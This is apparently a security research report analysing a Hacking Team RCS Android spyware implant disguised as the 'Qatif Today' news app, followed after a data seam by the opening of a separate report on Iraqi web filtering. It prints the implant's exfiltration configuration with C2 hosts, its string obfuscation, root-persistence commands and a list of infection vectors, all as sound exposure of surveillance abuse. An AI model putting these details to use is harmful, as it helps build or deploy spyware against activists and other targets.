international airport, asking whether the women are permitted to travel.\nInternet and social media users are encouraged to self-censor and report on each other.  The government engages in public advertising campaigns to encourage both behaviours, and makes it clear to Saudi citizens that they are watching, and listening.  In particular, the state has implemented specific penalties for re-sharing, privately or publicly, content deemed objectionable.  In addition to using the explicit tools of the law, it is widely believed that the state encourages an “electronic army” of pro-government individuals to swamp social media conversations with pro-regime voices and harass dissenters.\nSpeech involving religious themes is especially risky, as the government is willing to use serious religious charges, including the death penalty and corporal punishment, and tools of international jurisprudence like extradition, to detain and punish those who violate its strict norms for political, religious, and cultural speech.\nIn two notable cases, the operator of the Saudi Liberals discussion forum was eventually sentenced to 10 years in prison and 1000 lashes for maintaining a forum on the discussion of religion and reform.  This was a reduction of sorts, as the prosecution demanded his execution.  Many similar cases, using various charges, have been reported by human rights organizations and commentators.\nThese measures have an intentionally chilling effect on political speech, and are regularly the subject of criticism by the international human rights community.  Nevertheless, social media remains the primary outlet for political speech.  Many users practice some degree of self censorship, or indirect speech, while others use pseudonyms and other technical means to preserve their anonymity.   To access banned content, the use virtual private networks (VPNs) is also common. In response, security services use police and investigative powers to unmask the posters, and punishes them severely, sometimes after arrests where the name of the detainee(s) is kept secret.\nPhone use in Saudia Arabia has a penetration rate of 170%, with an estimated average of 30% of individual income spent on mobile phone and Internet costs in 2014.  As a result, older mechanisms of Internet surveillance, like monitoring Internet cafes, are being replaced.  Individual users are required to use real identities when registering mobile devices, and it is clear that the state is seeking greater visibility into encrypted traffic. In 2010, for example, Saudi Arabia successfully gained access to BlackBerry communications after making Saudi-located servers a quid-pro-quo of allowing the devices on Saudi Networks.  More recently, the government’s appetite for encrypted communications was revealed by Moxie Marlinspike, a security researcher and developer, who received an overture from Saudi telecom company Mobily seeking his assistance in accessing encrypted traffic.  The firm was seeking an intercept solution (on request of the Saudi Government, they said) for access to a range of mobile chat clients (Viber, LINE, WhatsApp) as well as the mobile-version of Twitter.\nThe use of mobile malware can be understood as part of this desire, by no means limited to Saudi Arabia, to match the technologies in use by their population.\nSeeding: A Lure with Political Subtext?\nUsing signatures developed as part of our ongoing research into “lawful intercept” malware developed by Hacking Team, we identified a suspicious Android installation package (APK).  The file was a functional copy of the ‘Qatif Today’ (القطيف اليوم) news application bundled with a Hacking Team payload.  Documents we have reviewed suggest that Hacking Team refers to this kind of mobile implant as an “Installation Package,” where a legitimate third party application file is bundled with the implant (See: Developing and Deploying Implants). This kind of tactic with Android package implants has been seen in other targeted malware attacks (that do not use commercial “lawful intercept” products) including the LuckyCat campaign, and in attacks against Tibetan activists, and groups in the Uyghur community.\nThe genuine ‘Qatif Today’ app is an Android (download here) and iPhone application that provides news and information in Arabic with a special relevance to the Qatif Governorate of Saudi Arabia.\nQatif Today in the Google Play app store\nThe connection to Qatif is interesting, given the recent history of protest in Qatif as outlined above.  We are not in a position to determine the identity of the group or individual targeted with this malware, however, we speculate that the attack may be linked to political protest in eastern Saudi Arabia.\nHacking Team Samples\nThe malicious APK, QatifNews.apk, has the following hash:\n8e64c38789c1bae752e7b4d0d58078399feb7cd3339712590cf727dfd90d254d\nAt the time of first submission to the VirusTotal database, the file was detected by zero out of 50 AntiVirus products in VirusTotal:\n0 / 50 2014-03-11 09:28:49 2014-03-11 09:28:49\nIt appears that an APK of the same name was seeded on Twitter 5 days later by a Twitter account (@_bhpearl)  linked to Bahrain, a country of great interest to Shia in Qatif.\nTweet with links by @_bhpearl (since deleted)\nThe tweeted links were shortened using the goo.gl service. These resolved to:\nhttps://itunes.apple.com/app/qatiftoday-alqtyf-alywm/id584947120?mt=8\nand\nhttps://dl.dropboxusercontent.com/s/fw92fsu9r694iqc/QatifNews.apk\nThe first link to the iTunes store has 18841 clicks on the shortened link and appears legitimate. The second link, however, does not redirect to the genuine app at the Android App Store. Instead, it redirects to a Dropbox file that has since been removed. Examination of analytics on the shortened second link is interesting; there were only 13 clicks. We can discount 7 of these clicks (those in US and Germany) as researchers, while three are in Saudi Arabia. One click in Taiwan may be a VPN, or a security researcher.\nGoogle Shortener Analytics\nWhile we cannot confirm that the file on Dropbox was the same APK, we suspect the timing of the tweet, and the use of a non-standard method for sharing an Android application,  is not a coincidence.\nMalicious APK Code Signing\nThe malicious apk was signed by the following certificate:\nIssuer:\nDN: C=US, O=Sun, OU=JavaSoft, CN=Server\nC: US\nCN: Server\nO: Sun\nOU: JavaSoft\nSubject:\nDN: C=US, O=Sun, OU=JavaSoft, CN=Server\nC: US\nCN: Server\nO: Sun\nOU: JavaSoft\nSerial: 1369041295\nSHA256 fingerprint: 8ab03660fe537994b207e900f8e2f5711c08e61232e167ce97e52bb3fd77757f\nA broader discussion of code-signing practices for Hacking Team implants is discussed later in the document in the section “Code Signing and Certificates”.\nAdditional Samples\nWe were able to identify an additional six samples signed with the same certificate:\ne85db2d92ae97f927905d6e931a0cb1f5b6def2475c23e023fe617249dddddb4\n0b657e29a3e249b414fbde3a85e7be0829ddaad49b8ff2832350cfe5af190ba1\n535070b5bd076f137052eb82257f16db4c3ba3e3516970b8934524e4a750a8f1\n748e04aee9ec1a82abd2f0a9d3ddc33925a8a74b5058088dbf3d6a3c1e9698d8\n8d2012d44208e79ea6e511847f86af0c45271e6f678ccc19639fe6c2eee75449\ne6a77c8bf232636a505c31fae0215789caf8d73682102304a2541513de945526\nThe first sample of this list (…db4) was submitted to VirusTotal as:\n\n\n\nDate\nFile Name\nSubmitter ID\nSubmitter Country\n\n\n2012-08-28 10:06:01\nrcs.apk\n18e48a9b (api)\nGermany\n\n\n\nInterestingly, this was the first sample (chronologically) to be submitted to VirusTotal from this group of files. The name “rcs.apk” appears to be an abbreviation of the name of Hacking Team’s targeted surveillance solution, ‘Remote Control System.’\nPermissions\nThe original app requires the following permissions:\nandroid.permission.INTERNET\nandroid.permission.GET_ACCOUNTS\nandroid.permission.WAKE_LOCK\nandroid.permission.READ_PHONE_STATE\nandroid.permission.ACCESS_FINE_LOCATION\ncom.google.android.c2dm.permission.RECEIVE\ncom.aymax.qatiftoday.permission.C2D_MESSAGE\nandroid.permission.USE_CREDENTIALS\nandroid.permission.WRITE_EXTERNAL_STORAGE\nandroid.permission.ACCESS_NETWORK_STATE\nandroid.permission.VIBRATE\nThe implant requests the following permissions, which give it the ability to process calls, read and write SMS messages, monitor the user’s GPS location, and more.\nandroid.permission.ACCESS_COARSE_LOCATION\nandroid.permission.ACCESS_WIFI_STATE\nandroid.permission.CALL_PHONE\nandroid.permission.CAMERA\nandroid.permission.CHANGE_NETWORK_STATE\nandroid.permission.CHANGE_WIFI_STATE\nandroid.permission.FLASHLIGHT\nandroid.permission.PROCESS_OUTGOING_CALLS\nandroid.permission.READ_CALENDAR\nandroid.permission.READ_CONTACTS\nandroid.permission.READ_LOGS\nandroid.permission.READ_PHONE_STATE\nandroid.permission.RECEIVE_BOOT_COMPLETED\nandroid.permission.RECEIVE_SMS\nandroid.permission.RECORD_AUDIO\nandroid.permission.SEND_SMS\nandroid.permission.SET_WALLPAPER\nandroid.permission.USER_PRESENT\nandroid.permission.WRITE_SMS\nThe following permission was requested by several of the other identified Hacking Team android implants:\nandroid.permission.WRITE_APN_SETTINGS (write Access Point Name settings)\nThis value allows applications to change the APN (Access Point Name), a setting on a mobile phone that identifies an external network the phone can access for data. This value is marked as not for use by third party applications in the Android Developers reference.1  For further discussion of this functionality, see: Other Capabilities.\nBehavior & Network Communication\nAfter analyzing the behavior of the application we were able to further confirm the malicious nature of the file.\nWhen executed, the app performs a POST to:\nhttp://iphone.al-motamiz.com/qatiftoday/gcms/register.php\nThis server is hosted at iWeb in Montreal:\n\n\n\nIP Address\n174.142.97.245\n\n\nHost\nserver.5edma.com\n\n\nLocation\n CA, Canada\n\n\nCity\nMontréal, QC H3E 1Z6\n\n\nOrganization\nIWeb Technologies\n\n\nISP\nIWeb Technologies\n\n\nAS Number\nAS32613 iWeb Technologies Inc.\n\n\n\nWe believe this to be legitimate communication by the decoy application.\nWe also observed command and control (C2) communication with two additional servers.  We later found the same IP addresses in decrypted text from the implant’s config file (see: Obfuscation / Implant Configuration).  Incidentally, this was consistent with how Hacking Team implants store C2 addresses.\n\nhttp://91.109.17.189/\nhttp://106.186.17.60/\n\nThe first server is hosted on Leaseweb in Germany:\n\n\n\nHost\n91.109.17.189\n\n\nLocation\n DE, Germany\n\n\nOrganization\nLeaseweb Germany GmbH (previously netdirekt e.

This finding indirectly validates the methods used in the previous report, and highlights the third IP as likely part of the same collection infrastructure.\n91.109.17.189\n206.190.155.40\n106.186.17.60\nThis additional IP is in a block owned by the hosting provider SoftLayer Technologies.\nRooting Exploit\nThe malicious implant attempts to stat() the following files:\n/dev/exynos-mem\n/dev/DspBridge\n/dev/s5p-smem\nThis behavior is consistent with a known exploit (CVE-2012-6422) that permits a user without permissions to write to a compromised device’s physical memory.  An in depth analysis of this exploit is provided by Azimuth Security here.\nWhile this exploit would not be effective against the latest version of the Android operating system, a high percentage of users still use legacy versions which may be vulnerable.2\nImage Credit: Google\nBackground on Rooting Android Devices\nRooting an Android phone typically involves two components: the su binary and a supervisor application.\nIn order to install the su binary, either the device manufacturer has allowed the boot loader to be unlocked or a vulnerability is exploited to temporarily elevate permissions. Once the su binary is installed, applications may use it in a controlled way to elevate their permissions for other purposes.\nThe su is much like the traditional Unix – it uses the suid flag so applications that call it elevate their permissions to that of the executable they are calling – in most cases, including this one, root. Each application on Android is run by its own user in order to prevent applications from accessing resources it does not have permissions for.\nA supervisor application (usually Superuser.apk) is used by people who intentionally root their phone so the su binary can call the supervisor which will then notify the user and allow them to approve or deny the privilege escalation. Thus, even with a rooted phone the user is still notified when applications perform actions requiring root access.\nHow this applies to the RCS Android Implant\nIn this case a vulnerability is exploited to initially gain root access, and a binary is dropped. It copies itself to /system/bin/rilcap (through /proc/self/exe) and sets its owner to be root as well as setting the executable and suid flags. This allows for persistent root access.\n/system/bin/rilcap 6250af9750606a4a06ca1ec0bfa127d0e37e1c7676e37773f461a91bfe0daf93\nRILCAP Functionality\nExamination of the binary revealed that basic techniques such as simple encryption of strings are used to hinder analysis.\nEncryption algorithm:\n\nif str is b[0]…b[n],\nlen = b[0] ^ b[1] ^ b[2]\nfor b[i] in b[3]…b[n]:\nb[i] = b[i] ^ b[1]\nb[i] = (b[i] – b[1]) & 0xff\nb[i] = b[i] ^ b[0]\n\nThe binary contains the following functionality:\n\nCapture information from the framebuffer (/dev/graphics/fb0) — which can then be used to assemble screenshots\nKill the volume daemon (which automatically detects and mounts storage devices when added)\nMount /system as read only or read write\nCheck /proc/mounts for an sdcard\nExecute commands from unprivileged applications using system()\nExecute commands from a file using execv /system/bin/sh\nModify /data/system/device-policies.xml to add the application as device admin\nCopy files\nModify file permissions\nChange file owners\nUnlink self\nRestart the device\n\nThis functionality allows RILCAP to act as the su binary would — only there is no supervisor application to notify the user of privilege escalation and offer the choice to allow or deny it.\nA full list of of commands can be found in Appendix B.\nFunctionality\nLooking at the samples as a group, we identified a range of behaviors indicative of the implant’s surveillance capabilities.\nAttempts to access 3rd party chat / voice apps:\nWe found that the apps attempt to access the local files stored by popular social media, chat, and call apps including Facebook, Viber, WhatsApp, Skype, LINE and QQ.\n/data/data/com.facebook.katana/databases\n/data/data/com.facebook.orca/databases\n/data/data/com.skype.raider/files/shared.xml\n/data/data/com.whatsapp/shared_prefs\n/data/data/com.whatsapp/shared_prefs/RegisterPhone.xml\n/data/data/com.viber.voip/files\n/data/data/com.tencent.mm/MicroMsg/\n/data/data/com.viber.voip/files/preferences/reg_viber_phone_num\n/data/data/jp.naver.line.android/databases/naver_line_myhome\n/data/data/jp.naver.line.android\n/data/data/jp.naver.line.android/databases\nIn addition, the app accesses the locally stored mail files belonging to the compromised user’s mail account.\n/data/data/com.google.android.gm/databases/mailstore.{username}@gmail.com.db\n\nObfuscation / Implant Configuration\nIn order to prevent additional scrutiny into the internals of the backdoor, the source code appears to have been heavily obfuscated through the use of DexGuard (0r similar), which can provide encryption for strings, entire classes and assets, considerably slowing and complicating the reverse engineering process.\nWhile analyzing the implant, we de-obfuscated the configuration file. Below, we highlight a number of lines that match functionality in RCS (for a more complete list see: Implant Modules and Functionality).\nWe find a range of audio recording, camera, video, key logging, “live mic,” chat, device info etc. configuration settings relevant to the surveillance functionality of the implant.  We also note the presence of a “crisis” module, which provides anti-analysis functionality explained below (see: Anti-Analysis Functionality & Anti Forensics).\n{“record”:true,”compression”:5,”buffer”:512000,”module”:”call“},{“module”:”camera“,”quality”:”med”},{“module”:”chat“},{“module”:”clipboard“},{“module”:”conference“,”number”:””},{“synchronize”:false,”position”:true,”module”:”crisis“,”mic”:true,”network”:{“processes”:[],”enabled”:false},”call”:true,”camera”:true,”hook”:{“processes”:[],”enabled”:true}},{“module”:”device“,”list”:false},{“module”:”keylog“},{“module”:”livemic“,”number”:””}\nWe also see what appear to be, location, screenshot-taking, and browsing activity modules.\n{“cell”:true,”gps”:false,”wifi”:true,”module”:”position“},{“quality”:”med”,”module”:”screenshot“,”onlywindow”:false},{“module”:”url“}\nWe also found that the implant seems to have been deployed with a filter to specify a date range (“datefrom” and “dateto” for the Mail, SMS and MMS messages it is seeking.\n{“mail“:{“filter”:{“datefrom”:”2014-03-10 00:00:00″,”maxsize”:100000,”dateto”:”2100-01-01 00:00:00″,”history”:true},”enabled”:true},”mms“:{“filter”:{“datefrom”:”2014-03-10 00:00:00″,”dateto”:”2100-01-01 00:00:00″,”history”:true},”enabled”:true},”module”:”messages”,”sms“:{“filter”:{“datefrom”:”2014-03-10 00:00:00″,”dateto”:”2100-01-01 00:00:00″,”history”:true},”enabled”:true}}\nWe also see information about how the implant exfiltrates data, along with its C2 servers. Interestingly, it appears that the implant is capable of monitoring the devices connectivity (e.g. wifi, cellular network), choosing connection type, and rate limiting the bandwidth.  Note that these are the same servers we observed in the implant’s network communications.\n{“desc”:”SYNC”,”subactions”:[{“host”:”91.109.17.189“,”mindelay”:0,”stop”:true,”cell“:true,”action”:”synchronize”,”wifi“:true,”maxdelay”:0,”bandwidth“:500000},{“host”:”106.186.17.60“,”mindelay”:0,”stop”:false,”cell”:true,”action”:”synchronize”,”wifi”:true,”maxdelay”:0,”bandwidth”:500000}]}]}\n \n\n\nPart 2: Hacking Team RCS Operation\nAfter we released our research on Hacking Team earlier this year, we were sent documentation by an anonymous individual pertaining to the set up and operation of Hacking Team’s RCS that Hacking Team provides to its customers.  The documents appear to date from fall 2013.  We have no knowledge as to the origin of the documents, and whoever sent them took steps to conceal their identity.  While the authenticity of these documents is unverified, we have not identified inconsistencies with what is currently known about Hacking Team RCS (our latest findings included).  We are concerned, however, that releasing the documents in their full form could bring risk to the source.  The following is thus a general overview of some of the functionality and specifics of the Remote Control System, according to these documents. The screenshots that we excerpt are clearly from instances marked as “Demo” copies, rather than actual operations.\nArchitecture of a Hacking Team RCS Deployment\nThe following image suggests the logical architecture of a prototypical Hacking Team RCS deployment.  In specific instances, according to these documents, a “distributed” architecture can be used (see: Appendix: Distributed Hacking Team RCS Architecture).\nImage Source: “Hacking Team, RCS 9: The hacking suite for governmental interception, System Administrator’s Guide,” 2013.\n \nPlayers in System Operation\nAccording to the documents, RCS has a series of defined roles, each with their own responsibilities and permissions on the system.  In brief:\n\nA System Administrator appears to receive training from Hacking Team during the “Contract Phase”, as well as other system administration tasks, including installing and updating RCS server networks as well as network injectors.\nAn Administrator creates accounts, and creates both operations and designates targets.\nA Technician is responsible for creating implants (named “agents” in the documentation) and managing network injectors.\nAnalysts handle outputs from the system and perform intelligence analysis via the RCS console.\n\n\nDeveloping and Deploying Implants\nAccording to the documents, the software can create a full range of implants through a “factory” which is compiled specifically for an investigation. The Technician is responsible for creating these agents using the “factory.”  Here is the prompt presented to the Technician:\nIn this image, the technician is preparing a Mac OSX implant. Image Source: “Hacking Team, RCS 9: The hacking suite for governmental interception,Technician’s Guide,” 2013.\nThe technician has a range of options from the Factory as well as the additional ability to use Network Injection (not pictured).  These options include:\n\nNetwork Injection:  via injected malicious traffic in cooperation with an ISP\nTactical Network Injection: on LAN or WiFi\nMelted Application: bundling a Hacking Team dropper alongside a bait application\nInstallation Package: a mobile installer\nExploit: document-based exploit for mobile and desktop\nLocal Installation: mobile installation via USB or SD card\nOffline Installation: create an ISO for a bootable SDHC, CD, or USB. This option includes the ability to infected hibernated and powered off devices\nQR Code:  a mobile link that, when pictured, will infect the target\nApplet Web: likely a malicious website (depreciated after v. 8.4)\nSilent Installer: a desktop executable that will install the implant\nInfected U3 USB: an auto-infecting U3 USB\nWAP Push Message: the target will be infected if the user accepts the message (works on all mobile operating systems apart from iOS)\n\nInfection: “Scout Agents” and “Agents”\nThe documents indicate that RCS makes use of a “scout agent,” commonly known as a “validator” that helps to determine whether a full implant (“agent”) should be installed. This thin implant collects screenshots and device information to determine whether the target is of interest.\nThe documents suggest that Hacking Team is explicitly concerned with the possibility that their implant could become unmasked, and instructs technicians that a function of “scout agents” is to determine whether the system is ‘safe’ to infect, or whether it could risk unmasking the agent.\nWhen the system is determined to be safe to infect, the “scout agent” is replaced by the full implant. According to the documents, Hacking Team advises users to gradually add functionality to implants. These implants exfiltrate data and receive instructions through a process called “synchronizing.”\n\nImplant Modules and Functionality\nThe implant (“agent”) offers one-click functionality for requesting information from target devices. Technicians are encouraged to add functionality as needed.\nImage Source: “Hacking Team, RCS 9: The hacking suite for governmental interception,Technician’s Guide,” 2013.\nIn addition, a more advanced approach can be taken, allowing a sophisticated technician to determine a specific sequence of module activation upon infection, using a graphical flow model. This allows the user to define events that trigger particular actions, sub-actions, modules, and sequences.\nThe documents provide an example of such a sequence:\nEvent: Device is connected to power adapter\nSub Action: Send SMS, begin logging position, disable an event keyed to SIM card changes.\nImage Source: “Hacking Team, RCS 9: The hacking suite for governmental interception,Technician’s Guide,” 2013.\nSelection of available surveillance modules\n\n\nAccessed files\nAddress Book\nApplications used\nCalendar\nContacts\nDevice Type\nFiles Accessed\nKeylogging\nSaved Passwords\nMouse Activity (intended to defeat virtual keyboards)\nRecord Calls and call data\nScreenshots\nTake Photographs with webcam\nRecord Chats\nCopy Clipboard\nRecord Audio from Microphone\n\nWith additional Voice and silence detection to conserve space\n\n\nRealtime audio surveillance (“live mic:” module is only available for Windows Mobile)\nDevice Position\nURLs Visited\nCreate conference calls (with a silent 3rd party)\nInfect other devices (depreciated since v. 8.4)\n\n\n\nOther Capabilities\nOnce an implant is operational its collection operations can be updated. In addition files can be sent to and received from the device.\nIn addition, implants have a default cap on “evidence” space of 1GB on the target device. Recording of new material stops when the space is reached. Operators also have the ability to delete not-yet-transmitted data on the device.\n\nSynchronizing & Data Exfiltration\nThe synchronizing process has a number of steps, paraphrased here:\n\nAuthorization between implant and server\nTime syncing between implant and RCS server\nImplant removal (if case specified as “closed” by technician)\nImplant configuration update\nImplant downloads material sent from the RCS server\nUpload to RCS server of “download” cue material\nUpload to RCS server of evidence, combined with secure delete\nAdditional secure deletion of evidence\n\nMobile and desktop versions have slightly different parameters. While desktop implants can have bandwidth and delays in sending materials added, the mobile settings have some unique features.\nTechnicians can force the type of data channel (WiFi or Cell Network) that the implant uses to update. Interestingly, technicians can specify login credentials for the APN used to exfiltrate data. This allows the implant to avoid incurring data charges and displaying traffic to the victim. The feature is specified as only available on BlackBerry and Symbian OS in Version 9 of RCS.\n\nAnti-Analysis Functionality & Anti Forensics\nA functionality referred to as “crisis” allows for actions on detection of “hostile” activity (the documents give the example of a packet sniffer). This functionality can be triggered by a range of scenarios and have a number of options based on identifying processes. In desktop versions, these options can including pausing synchronizing, and not hooking programs. For mobile versions these options includes pausing audio, camera, location collecting, and synchronizing.\nA wipe can also be triggered, and according to the documents, Hacking Team informs users that it will leave “no trace” of the implant. The uninstall action has several features that could be of interest in forensic analysis of potentially infected devices: (i) uninstall on BlackBerry triggers an automatic restart; (ii) uninstall on Android devices where root was not successfully gained results in a user prompt requesting permission to uninstall; (iii) on Windows Phone, uninstall deletes all files but does not remove the Application Icon from the list of programs.\n\nCode Signing and Certificates\nRCS is designed to incorporate code signing when creating implants. The documents helpfully suggest Verisign, Thawte and GoDaddy as sources of code signing certificates. In addition, the documents encourage users to contact Hacking Team technical support for assistance in obtaining a certificate.\nInteresingly, for Symbian, users are instructed to purchase a “Developer Certificate” directly from TrustCenter and even provides the URL (https://www.trustcenter.de/en/products/tc_ publisher_id_for_symbian.htm).\nFor infecting Windows Phones, users are encouraged to register a Microsoft account (signup.live.com) and a Windows Phone Dev Center account (https://dev.windowsphone.com/en-us/join/).\nThe documents indicate that Hacking Team is concerned with ensuring users correctly manage the approval process (managed by Symantec) and instructs users to promptly reply to phone and e-mail communications from Symantec.  Users also get instsructions in how to obtain an Enterprise Mobile Code Signing Certificate (https://products.websecurity.symantec.com/orders/enrollment/microsoftCert.do)\nAndroid Specific Issues\nIn order to run some of its modules (Chat, Messages, Screenshot), the Android implant requires root privileges on the device. In some cases, where acquisition of root privileges is unsuccessful, the victim can be manually asked to give the application root access. In addition, in cases where root has not been successfully acquired on an Android device, the victim sees a prompt requesting permission if an uninstall has been triggered.\nHacking Team helpfully notes that the default APK file implant appears as a normal application named “DeviceInfo” that displays device information. \nAnonymizer & Proxy Chain Architecture\nThis image highlights how a system administrator sees a distributed proxy chain (see: Appendix: Distributed Hacking Team RCS Architecture) and collector architecture.\nImage Source: “Hacking Team, RCS 9: The hacking suite for governmental interception, System Administrator’s Guide” 2013\nLicensing, Updates\nAt the time of creation of a collection architecture, a license file from Hacking Team is required by the software, according to the documents. Other licenses are required for for specific functionality, as well as the more developed analysis toolkits.\nThe documents suggest that Hacking Team maintains an update cycle for its products. The updating process is performed by a System Administrator using updates provided by Hacking Team and includes updates both to the collection and injector infrastructure, and to implants.\nAuditing\nThe program does appear to have a basic logging function and auditing capability, allowing authorized administrators to view logs of user actions throughout the system, including interactions with implants. This capability appears to have been developed to make the toolkit more compatible with evidence requirements for with digital material. We note however, the ease with which evidence, logs, implants, and “factories” can be irreversibly deleted by authorized users.\nAnalysts Eye View\nThis image graphically shows the ways in which multiple devices of a single target may be compromised and simultaneously monitored.\nImage Source: “Hacking Team, RCS 9: The hacking suite for governmental interception, Analysts Guide,” 2013\nAnalysts can perform searches on data using text strings as well as filtering and sorted data. In addition, Analysts can flag data for importance, as well as apply automated rules for flagging data.\nData storage makes use of the open source MongoDB, and documentation indicates that Hacking Team RCS uses MongoDB 2.4.8.\nNext, also from a demo instance, we see the information exfiltrated from a target computer. Of note is the use of a basic color coded flagging system (red, green, yellow) to flag evidence, as well as the kind of information available to the analyst from each capture. Here we see screenshots of particular program operations (e.g. running BlackBerry Desktop software, and Skype) as well as location information.  Addresses in the location information are identical to the publicly available address of Hacking Team.\nImage Source: “Hacking Team, RCS 9: The hacking suite for governmental interception, Analysts Guide,” 2013.\nIn the following image we see the analyst console playing back an intercepted Skype call.\nImage Source: “Hacking Team, RCS 9: The hacking suite for governmental interception, Analysts Guide,” 2013.\nIn the following image, we see live browsing of an infected system’s file tree. This is a functionality that can be enabled in certain cases.\nImage Source: “Hacking Team, RCS 9: The hacking suite for governmental interception, Analysts Guide,” 2013.\nThe image below shows a map and timeline view of the position of infected devices.  Interestingly, in this image, used as an instructional illustration, it appears that Hacking Team might have inadvertently revealed information about a demonstration to a US Law Enforcement to its other customers.  Specifically, the location of the “Jimmy Page” device on this map is in the access-controlled parking lot of the LA County Sheriff (and appears to be stamped with the date Sept 6 2013 or December 3 2012).  It may be coincidental that Hacking Team was extensively represented at the ISS World held later in September 2013 in the US.\nImage Source: “Hacking Team, RCS 9: The hacking suite for governmental interception, Analysts Guide,” 2013.\nThe use of Google maps in the tool provides a graphic view of the targets; however it may present a serious breach of operational security for clients, including betraying location data for ongoing investigations. Even if some of the point data is not transmitted, Google needs to know the map centroid (and hence target location) to deliver some of this map data.\nIt is possible that Hacking Team RCS is exposing highly sensitive investigation data of government clients to Google as they are making use of the Google Maps API to display this map. \nIn addition, Google Maps traffic, even using SSL, has been subject to successful traffic analysis by third parties in the past.  While we have not demonstrated this vulnerability, we believe this possibility warrants further investigation.\nBeyond collection of data, the documents indicate that Hacking Team is offering a basic investigation management toolkit including basic link analysis and other features with the purchase of an additional license.  The software can build very basic link analysis using “Peer” (contact between entities like calls) and “Know” (one or both individuals found in others phone book) links.  The system also automatically attempts to create identity links when details are shared between entities (e.g. a phone number).  Time-series and locational data can also be displayed.\nImage Source: “Hacking Team, RCS 9: The hacking suite for governmental interception, Analysts Guide,” 2013\nEvolving Terminology\nThe documents suggest that Hacking Team has made a number of changes in the language it uses to describe its tools. We found for example that in v7.6 and below they used the term “Backdoor” to refer to their implant, but changed the term in v 8.0 and above to “Agent.” Similarly, they changed the term “Backdoor Class” to “Factory” in the same time period.\n“Invisibility”\nAccording to the documents, Hacking Team appears to supply customers with an “Invisibility Report” for its RCS solultion. For example, we have reviewed the “Version 9.0 – Invisibility Report” for the Silent Installer, Melted application, Network Injector INJECT-EXE attack, and Offline CD.”\nThe document informs customers: Tests were performed on a default 64-bit Windows 7 installation.\nImage Source: “Version 9.0 – Invisibility Report,” undated.\nConclusion\nHacking Team’s Remote Control System is a surveillance malware toolkit marketed for “lawful interception” use. We identified and analyzed RCS Android implants that had lures with a political subtext suggesting targets in the Qatif Governorate of Saudi Arabia. Analysis of these implants revealed a range of surveillance functions.\nIn the past several years, we have researched both Gamma Group and Hacking Team, exposing their global proliferation, and highlighting the technologies and tactics that they use.  Our interest in these groups is not because they create the most sophisticated implants.  Indeed, since the Aurora incident in 2009, there have been many public reports of sophisticated malware used by nation states.  For example, Turla, a campaign attributed to Russia, was described as “one of the most complex cyber espionage programs uncovered to date.” Additional campaigns of note include Careto, linked to Spain [PDF], and Miniduke. Meanwhile, significant analysis and public discussion has gone into the Stuxnet, Duqu, and Flame, which are allegedly a product of US and Israeli collaboration.\nThese high-impact (and typically high development cost) implant kits all appear to be used exclusively by the countries they are attributed to, and are designed to perform targeted intrusions.\nHacking Team and Gamma Group are different for several reasons.  First, their software is available to all but a few countries, provided they pay.  Second, their software is marketed to target everyday criminality and “security threats,” whereas the state-sponsored campaigns we outlined above are designed to support espionage operations against hardened, high-value targets.\nThis type of exceptionally invasive toolkit, once a costly boutique capability deployed by intelligence communities and militaries, is now available to all but a handful of governments.  An unstated assumption is that customers that can pay for these tools will use them correctly, and primarily for strictly overseen, legal purposes.  As our research has shown, however, by dramatically lowering the entry cost on invasive and hard-to-trace monitoring, the equipment lowers the cost of targeting political threats for those with access to Hacking Team and Gamma Group toolkits.\nAcknowledgements\nSeth Hardy, Sarah McKune, Marcia Hoffman, Sebastian Porst, Masashi Crete-Nishihata, Bill Marczak, Ron Deibert, Human Rights Watch, Abeer Allam, and several journalists and researchers who were very generous with their time.\n\n\nAppendix A: Distributed Hacking Team RCS Architecture\nThis image shows a distributed Hacking Team RCS collection infrastructure, according to the documents.\nImage Source: “Hacking Team, RCS 9: The hacking suite for governmental interception, System Administrator’s Guide,” 2013\n\n\nAppendix B: List of ‘rilcap’ commands\nCommands provided by:\n/system/bin/rilcap 6250af9750606a4a06ca1ec0bfa127d0e37e1c7676e37773f461a91bfe0daf93\n\nvolkill the volume daemon (vold)\nblr\nmount /system as read-only\nblw\nmount /system as read-write\nrt\nclone self to /system/bin/rilcap with permissions 04755\nqzx [command] [args]\npasses argument to system()\nfhc [source] [destination]\ncopy file\npzm [permission flags] [file]\nmodify file permissions\nqzs\nread commands from file named qzs and execute them (execv /system/bin/sh …)\nreb\nreboot\nadm [name]\nadds [name] to device-policies.xml\nru\nunlink self\nfho [user] [user] [filename]\nmodify file owner\nsd\ncheck for and mount sd card (but it has path hardcoded as /mnt/sdcard, so won’t always work)\nfb [file]\ncopies from frame buffer to file (for screenshots)\n\n \nFootnotes\n1 http://developer.android.com/reference/android/Manifest.permission.html\n2 https://developer.android.com/about/dashboards/index.html\n\n\t\t\t\t\n\t\t\t",

    "text": "\n\t\t\t\tDownload PDF version I Read on ISSUU\nRead the Arabic Version  / النسخة العربية  translated by Cyber Arabs\nIn this report, we document the results of network measurement tests we ran to determine how the Internet is being filtered in Iraq in reaction to ongoing insurgency in the country. The results identify 20 unique URLs that are blocked on three Iraq-based Internet Service Providers. These websites include social media platforms (such as Facebook and Twitter), proxy / circumvention tools (such as Psiphon), and the websites of mobile messaging apps (such as WhatsApp and Viber). Notably, none of the 7 websites we tested that are affiliated with, or supportive of, the jihadist insurgent group the Islamic State in Iraq and Greater Syria (ISIS) were found to be blocked.\nBackground\nThe ongoing insurgency within Iraq continues to escalate. In recent weeks, the jihadist group, the Islamic State in Iraq and Greater Syria (ISIS) seized control of the northern provincial capitals Mosul and Tikrit and Iraq’s largest oil refinery. The conflict has led Iraqi Prime Minister, Nouri al-Maliki, to formally request the U.S. military to engage in air strikes to limit the ISIS advances.\nFollowing the seizure of Mosul and Tikrit, the government of Iraq implemented restrictions on Internet accessibility as means of limiting the ability of ISIS to mobilize and communicate their message.  On June 13, 2014, reports emerged that numerous social media platforms, including Facebook, Twitter, and YouTube, had been blocked. By June 16, reports suggested that Ministry of Communications officials had ordered a complete Internet shutdown in certain regions. These reports are confirmed by BGP data from Renesys:\nFigure 1: Renesys BGP Data showing reduction in reachable networks as a result of the shutdown. SOURCE\nSimilarly, traffic from the content delivery network Akamai dropped off substantially following the reported shutdown and blocks:\nFigure 2: Traffic from Akamai content delivery network to Iraq in June 2014.  SOURCE\nA letter allegedly leaked from the Ministry of Communications details these outages, indicating the ISIS-held provinces in which Internet access was to be blocked completely. In addition the letter lists  websites and platforms (which included Facebook, Twitter, YouTube, Viber, Skype, and others) to be blocked.\nMore recently, on the morning of June 20, measurements from the RIPE Network Coordination Centre  showed 4 of the 38 networks in Iraq went offline, including Earthlink, as shown in Figure 3:\nFigure 3: RIPE NCC measurements of ASNs in Iraq.  